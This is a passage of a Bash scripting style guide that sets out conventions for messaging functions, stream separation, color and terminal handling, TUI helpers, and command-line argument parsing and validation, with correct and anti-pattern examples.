>&2 echo "[$(date -Ins)]: $*"

# Acceptable
echo "[$(date +'%Y-%m-%dT%H:%M:%S%z')]: $*" >&2
```


---


**Rule: BCS0703**

## Core Message Functions

**Implement a private `_msg()` core function using `FUNCNAME[1]` inspection to automatically format messages based on caller.**

**Rationale:**
- **DRY/Consistent**: Single `_msg()` reused by all wrappers; impossible to pass wrong level
- **Context-aware**: `FUNCNAME[1]` detects caller automatically (info, warn, error, etc.)
- **Stream separation**: Errors/warnings to stderr, data to stdout (enables `data=$(./script)`)
- **Flag control**: `VERBOSE` controls info/warn/success; `DEBUG` controls debug; `PROMPT` controls yn()

### FUNCNAME Array

```bash
# FUNCNAME[0] = current function (_msg)
# FUNCNAME[1] = calling function (determines formatting!)
# FUNCNAME[2+] = higher call stack

process_file() {
  info "Processing ${1@Q}"
  # When info() calls _msg():
  #   FUNCNAME[1] = "info" �' cyan ◉ prefix
}
```

### Core Implementation

```bash
_msg() {
  local -- prefix="$SCRIPT_NAME:" msg

  case ${FUNCNAME[1]} in
    vecho)   ;;
    success) prefix+=" ${GREEN}✓${NC}" ;;
    warn)    prefix+=" ${YELLOW}▲${NC}" ;;
    info)    prefix+=" ${CYAN}◉${NC}" ;;
    error)   prefix+=" ${RED}✗${NC}" ;;
    debug)   prefix+=" ${YELLOW}DEBUG${NC}:" ;;
    *)       ;;
  esac

  for msg in "$@"; do
    printf '%s %s\n' "$prefix" "$msg"
  done
}

# Conditional (respect VERBOSE)
vecho()   { ((VERBOSE)) || return 0; _msg "$@"; }
success() { ((VERBOSE)) || return 0; >&2 _msg "$@"; }
warn()    { ((VERBOSE)) || return 0; >&2 _msg "$@"; }
info()    { ((VERBOSE)) || return 0; >&2 _msg "$@"; }

# Debug (respects DEBUG)
debug()   { ((DEBUG)) || return 0; >&2 _msg "$@"; }

# Unconditional
error()   { >&2 _msg "$@"; }

# Error and exit
die() { (($# < 2)) || error "${@:2}"; exit "${1:-0}"; }

# Yes/no prompt (respects PROMPT)
yn() {
  ((PROMPT)) || return 0
  local -- REPLY
  >&2 read -r -n 1 -p "$(2>&1 warn "${1:-'Continue?'}") y/n "
  >&2 echo
  [[ ${REPLY,,} == y ]]
}
```

### Color Definitions

```bash
if [[ -t 1 && -t 2 ]]; then
  declare -r RED=$'\033[0;31m' GREEN=$'\033[0;32m' YELLOW=$'\033[0;33m' CYAN=$'\033[0;36m' NC=$'\033[0m'
else
  declare -r RED='' GREEN='' YELLOW='' CYAN='' NC=''
fi
```

### Flag Variables

```bash
declare -i VERBOSE=0  # 1 = show info/warn/success
declare -i DEBUG=0    # 1 = show debug messages
declare -i PROMPT=1   # 0 = disable prompts (automation)
```

### Usage

```bash
info 'Starting processing...'          # Only if VERBOSE=1
success "Installed to $PREFIX"         # Only if VERBOSE=1
warn "Deprecated: $old_option"         # Only if VERBOSE=1
error "Invalid file: $filename"        # Always shown
debug "count=$count, file=$file"       # Only if DEBUG=1
die 1 'Critical error'                 # Exit with code and message
die 22 "File not found ${file@Q}"      # Exit code 22
die 1                                  # Exit without message
```

### Variant: Log to File

```bash
LOG_FILE=/var/log/"$SCRIPT_NAME".log

_msg() {
  local -- prefix="$SCRIPT_NAME:" msg timestamp

  case "${FUNCNAME[1]}" in
    success) prefix+=" ${GREEN}✓${NC}" ;;
    warn)    prefix+=" ${YELLOW}⚡${NC}" ;;
    info)    prefix+=" ${CYAN}◉${NC}" ;;
    error)   prefix+=" ${RED}✗${NC}" ;;
    debug)   prefix+=" ${YELLOW}DEBUG${NC}:" ;;
    *)       ;;
  esac

  for msg in "$@"; do
    printf '%s %s\n' "$prefix" "$msg"
    timestamp=$(date '+%Y-%m-%d %H:%M:%S')
    printf '[%s] %s: %s\n' "$timestamp" "${FUNCNAME[1]^^}" "$msg" >> "$LOG_FILE"
  done
}
```

### Minimal Variants

```bash
# No colors, no flags
info()  { >&2 echo "$SCRIPT_NAME: $*"; }
error() { >&2 echo "$SCRIPT_NAME: error: $*"; }
die() { (($# < 2)) || error "${@:2}"; exit "${1:-0}"; }

# With VERBOSE, no colors
declare -i VERBOSE=0
info()  { ((VERBOSE)) && >&2 echo "$SCRIPT_NAME: $*"; return 0; }
error() { >&2 echo "$SCRIPT_NAME: error: $*"; }
die() { (($# < 2)) || error "${@:2}"; exit "${1:-0}"; }
```

### Anti-Patterns

```bash
# ✗ Wrong - echo directly (no stderr, prefix, colors, VERBOSE)
echo "Error: file not found"
# ✓ Correct
error 'File not found'

# ✗ Wrong - duplicating logic in each function
info() { echo "[$SCRIPT_NAME] INFO: $*"; }
warn() { echo "[$SCRIPT_NAME] WARN: $*"; }
# ✓ Correct - use _msg core with FUNCNAME

# ✗ Wrong - errors to stdout
error() { echo "[ERROR] $*"; }
# ✓ Correct
error() { >&2 _msg "$@"; }

# ✗ Wrong - ignoring VERBOSE (always prints)
info() { >&2 _msg "$@"; }
# ✓ Correct
info() { ((VERBOSE)) || return 0; >&2 _msg "$@"; }

# ✗ Wrong - die without customizable exit code
die() { error "$@"; exit 1; }
# ✓ Correct
die() { (($# < 2)) || error "${@:2}"; exit "${1:-0}"; }

# ✗ Wrong - yn() can't disable prompts
yn() { read -r -n 1 -p "$1 y/n " reply; [[ ${reply,,} == y ]]; }
# ✓ Correct - respects PROMPT flag
yn() { ((PROMPT)) || return 0; ...; }
```

### Edge Cases

1. **Non-terminal output**: Colors disabled via `[[ -t 1 && -t 2 ]]` check
2. **Piping data**: `data=$(./script)` captures only stdout; messages go to stderr
3. **Automation**: Set `PROMPT=0` to skip yn() prompts


---


**Rule: BCS0704**

## Usage Documentation

Standard `show_help()` pattern using heredoc with variable interpolation.

```bash
show_help() {
  cat <<EOT
$SCRIPT_NAME $VERSION - Brief description

Detailed description.

Usage: $SCRIPT_NAME [Options] [arguments]

Options:
  -n|--num NUM      Set num to NUM

  -v|--verbose      Increase verbose output
  -q|--quiet        No verbosity

  -V|--version      Print version ('$SCRIPT_NAME $VERSION')
  -h|--help         This help message

Examples:
  # Example 1
  $SCRIPT_NAME -v file.txt
EOT
}
```

**Key elements:** Script name/version header, description, usage line, grouped options with blank-line separators, examples section.


---


**Rule: BCS0705**

## Echo vs Messaging Functions

**Choose plain `echo` for data output (stdout) and messaging functions for operational status (stderr). Stream separation enables script composition.**

**Rationale:**
- **Stream Separation**: Messaging�'stderr (user-facing), echo�'stdout (parseable data)
- **Verbosity Control**: Messaging respects `VERBOSE`; echo always displays
- **Script Composition**: Proper streams allow pipeline combining without mixing data/status

### When to Use Messaging Functions

**Operational status and diagnostics:**
```bash
info 'Starting database backup...'
success 'Database backup completed'
warn 'Backup size exceeds threshold'
error 'Database connection failed'
debug "Variable state: count=$count"
```

### When to Use Plain Echo

**1. Data output (return values):**
```bash
get_user_email() {
  local -- username=$1
  local -- email
  email=$(grep "^$username:" /etc/passwd | cut -d: -f5)
  echo "$email"  # Data output - must use echo
}
user_email=$(get_user_email 'alice')
```

**2. Help text and documentation:**
```bash
show_help() {
  cat <<EOT
$SCRIPT_NAME $VERSION - Brief description

Usage: $SCRIPT_NAME [Options] [arguments]

Options:
  -v|--verbose      Increase verbose output
  -h|--help         This help message
EOT
}
```

**3. Structured reports and parseable output:**
```bash
generate_report() {
  echo 'System Report'
  echo '============='
  df -h
}

list_users() {
  while IFS=: read -r user _; do
    echo "$user"
  done < /etc/passwd
}
list_users | grep '^admin'  # Pipeable
```

**4. Output that must always display:**
```bash
show_version() {
  echo "$SCRIPT_NAME $VERSION"  # Use echo, not info()
}
```

### Decision Matrix

| Question | Answer | Use |
|----------|--------|-----|
| Status or data? | Status | messaging function |
| Status or data? | Data | echo |
| Respect verbosity? | Yes | messaging function |
| Parsed/piped? | Yes | echo to stdout |
| Multi-line formatted? | Yes | echo/here-doc |
| Needs color/formatting? | Yes | messaging function |

### Anti-Patterns

```bash
# ✗ Wrong - using info() for data output
get_user_email() {
  info "$email"  # Goes to stderr! Can't be captured!
}
email=$(get_user_email alice)  # $email is empty!

# ✓ Correct
get_user_email() {
  echo "$email"  # Goes to stdout, can be captured
}

# ✗ Wrong - using echo for operational status
process_file() {
  echo "Processing ${file@Q}..."  # Mixes with data output!
  cat "$file"
}

# ✓ Correct
process_file() {
  info "Processing ${file@Q}..."  # Status to stderr
  cat "$file"                     # Data to stdout
}

# ✗ Wrong - help text using info()
show_help() {
  info 'Usage: script.sh [OPTIONS]'  # Won't display if VERBOSE=0!
}

# ✓ Correct - help text using cat
show_help() {
  cat <<'EOF'
Usage: script.sh [OPTIONS]
EOF
}

# ✗ Wrong - error messages to stdout
validate_input() {
  if [[ ! -f "$1" ]]; then
    echo "File not found ${1@Q}"  # Wrong stream!
    return 1
  fi
}

# ✓ Correct
validate_input() {
  if [[ ! -f "$1" ]]; then
    error "File not found ${1@Q}"  # To stderr
    return 1
  fi
}
```

### Edge Cases

**Progress during data generation:**
```bash
generate_data() {
  info 'Generating data...'  # Progress to stderr
  for ((i=1; i<=100; i+=1)); do
    echo "line $i"           # Data to stdout
  done
  success 'Complete'         # Status to stderr
}
data=$(generate_data)        # Captures only data
```

**Logging vs user messages:**
```bash
process_item() {
  local -- item=$1
  echo "[$(date '+%Y-%m-%d %H:%M:%S')] Processing: $item"  # Log (stdout�'file)
  info "Processing $item..."                                # User (stderr)
}
process_item "$item" >> "$log_file"
```

**Key principle:** Operational messages (how script works)�'stderr via messaging. Data output (what script produces)�'stdout via echo. This enables proper piping, capturing, and redirection.


---


**Rule: BCS0706**

## Color Management Library

For sophisticated color management beyond inline declarations (BCS0701), use a dedicated library providing two-tier system, terminal detection, and BCS _msg integration (BCS0703).

**Rationale:** Two-tier system prevents namespace pollution. Auto-detection/force modes handle deployment scenarios. `flags` option sets BCS control variables. Dual-purpose pattern (BCS010201) allows sourcing or executing.

**Two-Tier Color System:**

**Basic tier (5 variables):**
```bash
NC          # No Color / Reset
RED         # Error messages
GREEN       # Success messages
YELLOW      # Warnings
CYAN        # Information
```

**Complete tier (12 variables):**
```bash
# Basic tier plus:
BLUE        # Additional color option
MAGENTA     # Additional color option
BOLD        # Text emphasis
ITALIC      # Text styling
UNDERLINE   # Text emphasis
DIM         # De-emphasized text
REVERSE     # Inverted colors
```

**Library Function Signature:**

```bash
color_set [OPTIONS...]
```

**Options:**

| Option | Description |
|--------|-------------|
| `basic` | Enable basic 5-variable set (default) |
| `complete` | Enable complete 12-variable set |
| `auto` | Auto-detect terminal (checks stdout AND stderr) (default) |
| `always` | Force colors on (even when piped/redirected) |
| `never`, `none` | Force colors off |
| `verbose`, `-v`, `--verbose` | Print all variable declarations |
| `flags` | Set BCS _msg globals: VERBOSE, DEBUG, DRY_RUN, PROMPT |

**BCS _msg Integration:**

```bash
source color-set
color_set complete flags

# Now these globals are set:
# VERBOSE=1 (or preserved if already set)
# DEBUG=0
# DRY_RUN=1
# PROMPT=1
```

**Dual-Purpose Pattern (BCS010201):**

```bash
# Usage 1: Source as library (traditional)
source color-set
color_set complete
echo "${RED}Error:${NC} Failed"

# Usage 2: Source as library (enhanced - auto-calls color_set)
source color-set complete
echo "${RED}Error:${NC} Failed"

# Usage 3: Execute for demonstration
./color-set complete verbose
./color-set --help
```

**Implementation Example:**

```bash
#!/bin/bash
#shellcheck disable=SC2015
# color-set - Color management library

color_set() {
  local -i color=-1 complete=0 verbose=0 flags=0
  while (($#)); do
    case ${1:-auto} in
      complete) complete=1 ;;
      basic)    complete=0 ;;
      flags)    flags=1 ;;
      verbose|-v|--verbose)
                verbose=1 ;;
      always)   color=1 ;;
      never|none)
                color=0 ;;
      auto)     color=-1 ;;
      *)        >&2 echo "${FUNCNAME[0]}: ✗ Invalid argument ${1@Q}"
                return 2 ;;
    esac
    shift
  done

  # Auto-detect: both stdout AND stderr must be TTY
  ((color == -1)) && { [[ -t 1 && -t 2 ]] && color=1 || color=0; } ||:

  # Set BCS control flags if requested
  if ((flags)); then
    declare -igx VERBOSE=${VERBOSE:-1}
    ((complete)) && declare -igx DEBUG=0 DRY_RUN=1 PROMPT=1 || :
  fi

  # Declare color variables
  if ((color)); then
    declare -gx NC=$'\033[0m' RED=$'\033[0;31m' GREEN=$'\033[0;32m' YELLOW=$'\033[0;33m' CYAN=$'\033[0;36m'
    ((complete)) && declare -gx BLUE=$'\033[0;34m' MAGENTA=$'\033[0;35m' BOLD=$'\033[1m' ITALIC=$'\033[3m' UNDERLINE=$'\033[4m' DIM=$'\033[2m' REVERSE=$'\033[7m' || :
  else
    declare -gx NC='' RED='' GREEN='' YELLOW='' CYAN=''
    ((complete)) && declare -gx BLUE='' MAGENTA='' BOLD='' ITALIC='' UNDERLINE='' DIM='' REVERSE='' || :
  fi

  # Verbose output if requested
  if ((verbose)); then
    ((flags)) && declare -p VERBOSE ||:
    declare -p NC RED GREEN YELLOW CYAN
    ((complete)) && {
      ((flags)) && declare -p DEBUG DRY_RUN PROMPT ||:
      declare -p BLUE MAGENTA BOLD ITALIC UNDERLINE DIM REVERSE
    } ||:
  fi

  return 0
}
declare -fx color_set

# Dual-purpose pattern: enhanced syntax support
[[ ${BASH_SOURCE[0]} == "$0" ]] || {
  (($#)) && color_set "$@" || :
  return 0
}

# Executable section (only runs when executed directly)
#!/bin/bash #semantic
set -euo pipefail

declare -r VERSION=1.0.1

# Help handling
if [[ ${1:-} =~ ^(-h|--help|help)$ ]]; then
  cat <<HELP
color-set $VERSION [OPTIONS...]

Dual-purpose bash library for terminal color management with ANSI escape codes.

MODES:
  Source as library:  source color-set; color_set [OPTIONS]
  Execute directly:   color-set [OPTIONS]

OPTIONS:
  complete          Enable complete color set (12 variables)
  basic             Enable basic color set (5 variables) [default]

  always            Force colors on
  never, none       Force colors off
  auto              Auto-detect TTY [default]

  verbose, -v       Print variable declarations
  --verbose

  flags             Set standard BCS globals for _msg system messaging constructs
                    • With 'basic': Sets VERBOSE only
                    • With 'complete': Sets VERBOSE, DEBUG, DRY_RUN, PROMPT

BASIC TIER (5 variables):
  NC, RED, GREEN, YELLOW, CYAN

COMPLETE TIER (+7 additional variables):
  BLUE, MAGENTA, BOLD, ITALIC, UNDERLINE, DIM, REVERSE

EXAMPLES:
  color-set complete verbose
  color-set always
  source color-set && color_set complete && echo "\${RED}Error\${NC}"

OPTIONS can be combined in any order.
HELP
  exit 0
fi

color_set "$@"

#fin
```

**Usage Examples:**

```bash
# Basic usage
source color-set
color_set basic
echo "${RED}Error:${NC} Operation failed"
echo "${GREEN}Success:${NC} Operation completed"

# Complete tier with attributes
source color-set
color_set complete
echo "${BOLD}${RED}CRITICAL ERROR${NC}"
echo "${ITALIC}${CYAN}Note:${NC} ${DIM}Additional details${NC}"

# Force colors for piped output
source color-set
color_set complete always
./script.sh | less -R

# Integrated with BCS _msg system
source color-set complete flags
info "Starting process"        # Uses CYAN, respects VERBOSE
success "Build completed"      # Uses GREEN, respects VERBOSE
```

**Anti-patterns:**

❌ **Scattered inline declarations:**
```bash
# DON'T: Duplicate declarations across scripts
RED=$'\033[0;31m'
GREEN=$'\033[0;32m'
# ... repeated in every script
```

❌ **Testing only stdout:**
```bash
# DON'T: Incomplete terminal detection
[[ -t 1 ]] && color=1  # Fails when stderr redirected
# DO: Test both streams
[[ -t 1 && -t 2 ]] && color=1 || color=0
```

❌ **Forcing colors without user control:**
```bash
# DON'T: Hardcode color mode
color_set always
# DO: Respect environment or provide flag
color_set ${COLOR_MODE:-auto}
```

**Cross-References:** BCS0701 (inline colors), BCS0703 (_msg system), BCS010201 (dual-purpose pattern)

**Ref:** BCS0706


---


**Rule: BCS0707**

## TUI Basics

**Rule: BCS0907**

Text-based user interface elements for terminal scripts: visual feedback, progress indication, interactive prompts.

---

#### Progress Indicators

```bash
# Simple spinner
spinner() {
  local -a frames=('⠋' '⠙' '⠹' '⠸' '⠼' '⠴' '⠦' '⠧' '⠇' '⠏')
  local -i i=0
  while :; do
    printf '\r%s %s' "${frames[i % ${#frames[@]}]}" "$*"
    i+=1
    sleep 0.1
  done
}

# Start spinner in background
spinner 'Processing...' &
spinner_pid=$!

# Do work...
long_operation

# Stop spinner
kill "$spinner_pid" 2>/dev/null
printf '\r\033[K'  # Clear line
```

#### Progress Bar

```bash
progress_bar() {
  local -i current=$1 total=$2 width=${3:-50}
  local -i filled=$((current * width / total))
  local -i empty=$((width - filled))
  local -- bar

  bar=$(printf '%*s' "$filled" '' | tr ' ' '█')
  bar+=$(printf '%*s' "$empty" '' | tr ' ' '░')

  printf '\r[%s] %3d%%' "$bar" $((current * 100 / total))
}

# Usage
declare -i i
for ((i=1; i<=100; i+=1)); do
  progress_bar "$i" 100
  sleep 0.05
done
echo
```

#### Cursor Control

```bash
# Hide/show cursor
hide_cursor() { printf '\033[?25l'; }
show_cursor() { printf '\033[?25h'; }
trap 'show_cursor' EXIT

# Move cursor
move_up() { printf '\033[%dA' "${1:-1}"; }
move_down() { printf '\033[%dB' "${1:-1}"; }
move_to() { printf '\033[%d;%dH' "$1" "$2"; }

# Clear operations
clear_line() { printf '\033[2K\r'; }
clear_screen() { printf '\033[2J\033[H'; }
clear_to_end() { printf '\033[J'; }
```

#### Interactive Menu

```bash
select_option() {
  local -a options=("$@")
  local -i selected=0
  local -- key

  hide_cursor
  trap 'show_cursor' RETURN

  while ((1)); do
    # Display menu
    local -i i
    for ((i=0; i<${#options[@]}; i+=1)); do
      if ((i == selected)); then
        printf '  \033[7m %s \033[0m\n' "${options[i]}"
      else
        printf '   %s\n' "${options[i]}"
      fi
    done

    # Read keypress
    IFS= read -rsn1 key
    case $key in
      $'\x1b')  # Escape sequence
        read -rsn2 key
        case "$key" in
          '[A') ((selected > 0)) && ((selected-=1)) ;;  # Up
          '[B') ((selected < ${#options[@]}-1)) && ((selected+=1)) ;;  # Down
        esac
        ;;
      '') break ;;  # Enter
    esac

    # Move cursor back up
    printf '\033[%dA' "${#options[@]}"
  done

  show_cursor
  return "$selected"
}

# Usage
select_option 'Option 1' 'Option 2' 'Option 3'
selected=$?
```

---

#### Anti-Patterns

```bash
# ✗ Wrong - TUI without terminal check
progress_bar 50 100  # Garbage if not a terminal

# ✓ Correct - check for terminal
if [[ -t 1 ]]; then
  progress_bar 50 100
else
  echo '50% complete'
fi
```

---

**See Also:** BCS0908 (Terminal Capabilities), BCS0701 (Color Support)

#fin


---


**Rule: BCS0708**

## Terminal Capabilities

**Rule: BCS0908**

Detecting and utilizing terminal features safely.

---

#### Rationale

Terminal capability detection ensures scripts work in all environments with graceful fallbacks, enables rich output when available, and prevents garbage output in non-terminal contexts.

---

#### Terminal Detection

```bash
# Check if stdout is a terminal
if [[ -t 1 ]]; then
  USE_COLORS=1
else
  USE_COLORS=0
fi

# Check both stdout and stderr
if [[ -t 1 && -t 2 ]]; then
  declare -r RED=$'\033[0;31m' NC=$'\033[0m'
else
  declare -r RED='' NC=''
fi
```

#### Terminal Size

```bash
get_terminal_size() {
  if [[ -t 1 ]]; then
    TERM_COLS=$(tput cols 2>/dev/null || echo 80)
    TERM_ROWS=$(tput lines 2>/dev/null || echo 24)
  else
    TERM_COLS=80
    TERM_ROWS=24
  fi
}

trap 'get_terminal_size' WINCH
get_terminal_size
```

#### Capability Checking

```bash
has_capability() {
  local -- cap=$1
  tput "$cap" &>/dev/null
}

if has_capability colors; then
  num_colors=$(tput colors)
  ((num_colors >= 256)) && USE_256_COLORS=1
fi

has_unicode() {
  [[ "${LC_ALL:-${LC_CTYPE:-${LANG:-}}}" == *UTF-8* ]]
}
```

#### Safe Output Functions

```bash
print_line() {
  local -i width=${TERM_COLS:-80}
  printf '%*s\n' "$width" '' | tr ' ' '─'
}

truncate_string() {
  local -- str=$1
  local -i max=${2:-$TERM_COLS}
  if ((${#str} > max)); then
    echo "${str:0:$((max-3))}..."
  else
    echo "$str"
  fi
}

center_text() {
  local -- text=$1
  local -i width=${TERM_COLS:-80}
  local -i padding=$(((width - ${#text}) / 2))
  printf '%*s%s\n' "$padding" '' "$text"
}
```

#### ANSI Code Reference

```bash
declare -r ESC=$'\033'

# Colors (foreground)
declare -r BLACK="${ESC}[30m"  RED="${ESC}[31m"
declare -r GREEN="${ESC}[32m"  YELLOW="${ESC}[33m"
declare -r BLUE="${ESC}[34m"   MAGENTA="${ESC}[35m"
declare -r CYAN="${ESC}[36m"   WHITE="${ESC}[37m"

# Styles
declare -r BOLD="${ESC}[1m"    DIM="${ESC}[2m"
declare -r ITALIC="${ESC}[3m"  UNDERLINE="${ESC}[4m"
declare -r BLINK="${ESC}[5m"   REVERSE="${ESC}[7m"

# Reset
declare -r NC="${ESC}[0m"

# Cursor
declare -r HIDE_CURSOR="${ESC}[?25l"
declare -r SHOW_CURSOR="${ESC}[?25h"
declare -r SAVE_CURSOR="${ESC}7"
declare -r RESTORE_CURSOR="${ESC}8"
```

---

#### Anti-Patterns

```bash
# ✗ Wrong - assuming terminal support
echo -e '\033[31mError\033[0m'  # May output garbage

# ✓ Correct - conditional output
if [[ -t 1 ]]; then
  echo -e '\033[31mError\033[0m'
else
  echo 'Error'
fi
```

```bash
# ✗ Wrong - hardcoded width
printf '%-80s\n' "$text"  # May wrap or truncate wrong

# ✓ Correct - use terminal width
printf '%-*s\n' "${TERM_COLS:-80}" "$text"
```

---

**See Also:** BCS0907 (TUI Basics), BCS0906 (Color Management)


---


**Rule: BCS0800**

# Command-Line Arguments

This section establishes the standard argument parsing pattern supporting both short options (`-h`, `-v`) and long options (`--help`, `--version`), ensuring consistent command-line interfaces. It defines canonical version output format (`scriptname X.Y.Z`), validation patterns for required arguments and option conflicts, and guidance on argument parsing placement (main function vs top-level) based on script complexity. These patterns ensure scripts are predictable, user-friendly, and maintainable for both interactive and automated usage.


---


**Rule: BCS0801**

## Standard Argument Parsing Pattern

**Complete pattern with short option support:**

```bash
while (($#)); do case $1 in
  -V|--version)   echo "$SCRIPT_NAME $VERSION"; exit 0 ;;
  -h|--help)      show_help; exit 0 ;;

  -a|--add)       noarg "$@"; shift
                  process_argument "$1" ;;
  -m|--depth)     noarg "$@"; shift
                  max_depth=$1 ;;
  -L|--follow-symbolic)
                  symbolic='-L' ;;

  -p|--prompt)    PROMPT=1; ((VERBOSE)) || VERBOSE=1 ;;
  -v|--verbose)   VERBOSE+=1 ;;
  -q|--quiet)     VERBOSE=0 ;;

  -[VhamLpvq]*) #shellcheck disable=SC2046 #split up single options
                  set -- '' $(printf -- '-%c ' $(grep -o . <<<"${1:1}")) "${@:2}" ;;
  -*)             die 22 "Invalid option ${1@Q}" ;;
  *)              Paths+=("$1") ;;
esac; shift; done
```

**Pattern components:**

| Component | Purpose |
|-----------|---------|
| `while (($#))` | Arithmetic test, more efficient than `[[ $# -gt 0 ]]` |
| `case $1 in` | Pattern matching, cleaner than if/elif chains |
| `noarg "$@"; shift` | Validate argument exists, then shift to capture value |
| `VERBOSE+=1` | Stackable flags: `-vvv` = `VERBOSE=3` |
| `-[opts]*` branch | Short option bundling: `-vpL` �' `-v -p -L` |
| `die 22` | Exit code 22 (EINVAL) for invalid options |
| `*)` | Default: collect positional arguments |
| `esac; shift; done` | Mandatory shift after each iteration |

**The `noarg` helper:**

```bash
noarg() { (($# > 1)) || die 2 "Option ${1@Q} requires an argument"; }
```

Validates option has argument before shifting. `(($# > 1))` ensures at least 2 args remain.

**Short option bundling mechanism:**

```bash
-[VhamLpvq]*) #shellcheck disable=SC2046 #split up single options
              set -- '' $(printf -- '-%c ' $(grep -o . <<<"${1:1}")) "${@:2}" ;;
```

1. `${1:1}` removes leading dash (`-vpL` �' `vpL`)
2. `grep -o .` splits to individual characters
3. `printf -- "-%c "` adds dash before each
4. `set --` replaces argument list with expanded options

**Complete example:**

```bash
#!/usr/bin/env bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

declare -r VERSION=1.0.0
#shellcheck disable=SC2155
declare -r SCRIPT_PATH=$(realpath -- "$0")
declare -r SCRIPT_DIR=${SCRIPT_PATH%/*} SCRIPT_NAME=${SCRIPT_PATH##*/}

# Default values
declare -i VERBOSE=0
declare -i DRY_RUN=0
declare -- output_file=''
declare -a files=()

error() { >&2 echo "$SCRIPT_NAME: error: $*"; }
die() { (($# < 2)) || error "${@:2}"; exit "${1:-0}"; }
noarg() { (($# > 1)) || die 2 "Option ${1@Q} requires an argument"; }

show_help() {
  cat <<EOF
Usage: $SCRIPT_NAME [OPTIONS] FILE...

Options:
  -o, --output FILE  Output file (required)
  -v, --verbose      Verbose output
  -n, --dry-run      Dry-run mode
  -V, --version      Show version
  -h, --help         Show this help
EOF
}

main() {
  while (($#)); do case $1 in
    -o|--output)    noarg "$@"; shift
                    output_file=$1 ;;
    -v|--verbose)   VERBOSE+=1 ;;
    -n|--dry-run)   DRY_RUN=1 ;;
    -V|--version)   echo "$SCRIPT_NAME $VERSION"; exit 0 ;;
    -h|--help)      show_help; exit 0 ;;

    -[ovnVh]*)    #shellcheck disable=SC2046
                    set -- '' $(printf -- "-%c " $(grep -o . <<<"${1:1}")) "${@:2}" ;;
    -*)             die 22 "Invalid option ${1@Q}" ;;
    *)              files+=("$1") ;;
  esac; shift; done

  readonly -- VERBOSE DRY_RUN output_file
  readonly -a files

  ((${#files[@]} > 0)) || die 2 'No input files specified'
  [[ -n "$output_file" ]] || die 2 'Output file required (use -o)'

  local -- file
  for file in "${files[@]}"; do
    ((VERBOSE)) && echo "Processing ${file@Q}" ||:
  done
}

main "$@"

#fin
```

**Anti-patterns:**

```bash
# ✗ Wrong - verbose loop condition
while [[ $# -gt 0 ]]; do
# ✓ Correct
while (($#)); do

# ✗ Wrong - missing noarg validation
-o|--output)    shift
                output_file=$1 ;;  # Fails if no argument!
# ✓ Correct
-o|--output)    noarg "$@"; shift
                output_file=$1 ;;

# ✗ Wrong - missing shift causes infinite loop
esac; done
# ✓ Correct
esac; shift; done

# ✗ Wrong - if/elif chains
if [[ "$1" == '-v' ]] || [[ "$1" == '--verbose' ]]; then
# ✓ Correct - case statement
case $1 in
  -v|--verbose) VERBOSE+=1 ;;
```

**Rationale:** Consistent structure across scripts, handles all option types, validates arguments safely, case statements more readable than conditionals, arithmetic tests more efficient.


---


**Rule: BCS0802**

## Version Output Format

**Standard format:** `<script_name> <version_number>`

Output script name, space, version number. Do **not** include "version", "vs", or "v".

```bash
# ✓ Correct
-V|--version)   echo "$SCRIPT_NAME $VERSION"; exit 0 ;;
# Output: myscript 1.2.3

# ✗ Wrong - do not include the word "version"
-V|--version)   echo "$SCRIPT_NAME version $VERSION"; exit 0 ;;
# Output: myscript version 1.2.3  (incorrect)
```

**Rationale:** Follows GNU standards and Unix/Linux utility conventions.


---


**Rule: BCS0803**

## Argument Validation

**Use validation helpers to ensure option arguments exist and are valid types before processing.**

**Rationale:** Prevents silent failures (e.g., `--output --verbose` where filename missing becomes `OUTPUT='--verbose'`), provides clear error messages, validates data types before arithmetic use.

### Three Validation Patterns

**1. `noarg()` - Basic Existence Check**

```bash
noarg() { (($# > 1)) && [[ ${2:0:1} != '-' ]] || die 2 "Missing argument for option ${1@Q}"; }
```

Checks: at least 2 arguments remain, next argument doesn't start with `-`.

**2. `arg2()` - Enhanced Validation with Safe Quoting**

```bash
arg2() {
  if ((${#@}-1<1)) || [[ "${2:0:1}" == '-' ]]; then
    die 2 "${1@Q} requires argument"
  fi
}
```

Uses `${1@Q}` for safe parameter quoting in error messages (escapes special characters).

**3. `arg_num()` - Numeric Argument Validation**

```bash
arg_num() { ((${#@}-1<1)) || [[ ! "$2" =~ ^[0-9]+$ ]] && die 2 "${1@Q} requires a numeric argument" ||:; }
```

Validates integer pattern (`^[0-9]+$`). Rejects negative numbers, decimals, non-numeric text.

### Complete Example

```bash
declare -i MAX_DEPTH=5 VERBOSE=0
declare -- OUTPUT_FILE=''
declare -a INPUT_FILES=()

main() {
  while (($#)); do case $1 in
    -o|--output)
      arg2 "$@"                 # String validation
      shift
      OUTPUT_FILE=$1
      ;;

    -d|--depth)
      arg_num "$@"              # Numeric validation
      shift
      MAX_DEPTH=$1
      ;;

    -v|--verbose)
      VERBOSE=1                 # No argument needed
      ;;

    -*)
      die 22 "Invalid option ${1@Q}"
      ;;

    *)
      INPUT_FILES+=("$1")       # Positional argument
      ;;
  esac; shift; done

  readonly -- OUTPUT_FILE MAX_DEPTH VERBOSE
}

# Validation helpers
arg2() { ((${#@}-1<1)) || [[ "${2:0:1}" == '-' ]] && die 2 "${1@Q} requires argument" ||:; }
arg_num() { ((${#@}-1<1)) || [[ ! "$2" =~ ^[0-9]+$ ]] && die 2 "${1@Q} requires a numeric argument" ||:; }
noarg() { (($# > 1)) && [[ ${2:0:1} != '-' ]] || die 2 "Missing argument for option ${1@Q}"; }

main "$@"
```

### Choosing the Right Validator

| Validator | Use Case | Example Options |
|-----------|----------|----------------|
| `noarg()` | Simple existence check | `-o FILE`, `-m MSG` |
| `arg2()` | String args, prevent `-` prefix | `--prefix PATH`, `--output FILE` |
| `arg_num()` | Numeric args requiring integers | `--depth NUM`, `--retries COUNT` |

### Anti-Patterns

```bash
# ✗ No validation - silent failure
-o|--output) shift; OUTPUT="$1" ;;
# Problem: --output --verbose �' OUTPUT='--verbose'

# ✗ No validation - type error later
-d|--depth) shift; MAX_DEPTH="$1" ;;
# Problem: --depth abc �' arithmetic errors: "abc: syntax error"

# ✗ Manual validation - verbose and repetitive
-p|--prefix)
  if (($# < 2)); then
    die 2 "Option '-p' requires an argument"
  fi
  shift
  PREFIX=$1
  ;;

# ✓ Use helpers
-p|--prefix) arg2 "$@"; shift; PREFIX=$1 ;;
```

### Edge Cases

**Error message quality with `${1@Q}`:**
```bash
# User input: script '--some-weird$option' value
# With ${1@Q}: error: '--some-weird$option' requires argument
# Without:     error: --some-weird (crashes or expands $option)
```

**Critical:** Always call validator BEFORE `shift` - validator needs to inspect `$2`.

